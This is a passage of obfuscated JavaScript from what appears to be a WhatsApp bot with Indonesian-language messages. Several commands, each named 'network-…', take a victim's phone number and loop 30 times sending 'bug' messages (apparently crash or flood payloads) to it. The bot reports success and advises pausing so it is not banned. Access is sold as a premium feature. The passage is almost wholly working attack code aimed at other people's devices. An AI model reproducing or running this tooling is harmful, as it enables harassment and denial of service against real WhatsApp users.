            await _0x4de787(_0x471b3c, _0x600e6e);
            await _0x4b4561(_0x471b3c, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x582198 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "network-kominfo":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5244c2 = q.replace(/[^0-9]/g, '');
          if (_0x5244c2.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x12f04c = _0x5244c2 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x2bb4fa = 0x0; _0x2bb4fa < 0x1e; _0x2bb4fa++) {
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x28a511(_0x12f04c);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x28a511(_0x12f04c);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x28a511(_0x12f04c);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4de787(_0x12f04c, _0x600e6e);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4de787(_0x12f04c, _0x600e6e);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4b4561(_0x12f04c, _0x600e6e);
            await _0x156efb(_0x12f04c, _0x3facec);
            await _0x4de787(_0x12f04c, _0x600e6e);
            await _0x4b4561(_0x12f04c, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x5244c2 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "network-axis":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x47b365 = q.replace(/[^0-9]/g, '');
          if (_0x47b365.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x10273f = _0x47b365 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x9c66d9 = 0x0; _0x9c66d9 < 0x1e; _0x9c66d9++) {
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x28a511(_0x10273f);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x28a511(_0x10273f);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x28a511(_0x10273f);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4de787(_0x10273f, _0x600e6e);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4de787(_0x10273f, _0x600e6e);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4b4561(_0x10273f, _0x600e6e);
            await _0x156efb(_0x10273f, _0x3facec);
            await _0x4de787(_0x10273f, _0x600e6e);
            await _0x4b4561(_0x10273f, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x47b365 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case 'network-reels':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1e08cb = q.replace(/[^0-9]/g, '');
          if (_0x1e08cb.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x55d55d = _0x1e08cb + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x362735 = 0x0; _0x362735 < 0x1e; _0x362735++) {
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x28a511(_0x55d55d);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x28a511(_0x55d55d);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x28a511(_0x55d55d);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4de787(_0x55d55d, _0x600e6e);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4de787(_0x55d55d, _0x600e6e);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4b4561(_0x55d55d, _0x600e6e);
            await _0x156efb(_0x55d55d, _0x3facec);
            await _0x4de787(_0x55d55d, _0x600e6e);
            await _0x4b4561(_0x55d55d, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x1e08cb + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "network-xns":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x39c3c9 = q.replace(/[^0-9]/g, '');
          if (_0x39c3c9.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x31392c = _0x39c3c9 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x1b5162 = 0x0; _0x1b5162 < 0x1e; _0x1b5162++) {
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x28a511(_0x31392c);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x28a511(_0x31392c);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x28a511(_0x31392c);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4de787(_0x31392c, _0x600e6e);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4de787(_0x31392c, _0x600e6e);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4b4561(_0x31392c, _0x600e6e);
            await _0x156efb(_0x31392c, _0x3facec);
            await _0x4de787(_0x31392c, _0x600e6e);
            await _0x4b4561(_0x31392c, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x39c3c9 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "network-five":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x58f3fa = q.replace(/[^0-9]/g, '');
          if (_0x58f3fa.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x469b24 = _0x58f3fa + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x14c235 = 0x0; _0x14c235 < 0x1e; _0x14c235++) {
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x28a511(_0x469b24);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x28a511(_0x469b24);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x28a511(_0x469b24);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4de787(_0x469b24, _0x600e6e);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4de787(_0x469b24, _0x600e6e);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4b4561(_0x469b24, _0x600e6e);
            await _0x156efb(_0x469b24, _0x3facec);
            await _0x4de787(_0x469b24, _0x600e6e);
            await _0x4b4561(_0x469b24, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x58f3fa + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case 'network-wolf':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x384942 = q.replace(/[^0-9]/g, '');
          if (_0x384942.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x372ff5 = _0x384942 + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x12b3d7 = 0x0; _0x12b3d7 < 0x1e; _0x12b3d7++) {
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x28a511(_0x372ff5);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x28a511(_0x372ff5);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x28a511(_0x372ff5);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4de787(_0x372ff5, _0x600e6e);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4de787(_0x372ff5, _0x600e6e);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4b4561(_0x372ff5, _0x600e6e);
            await _0x156efb(_0x372ff5, _0x3facec);
            await _0x4de787(_0x372ff5, _0x600e6e);
            await _0x4b4561(_0x372ff5, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x384942 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "network-fels":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x4db80f = q.replace(/[^0-9]/g, '');
          if (_0x4db80f.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x316395 = _0x4db80f + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x2aa3dc = 0x0; _0x2aa3dc < 0x1e; _0x2aa3dc++) {
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x28a511(_0x316395);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
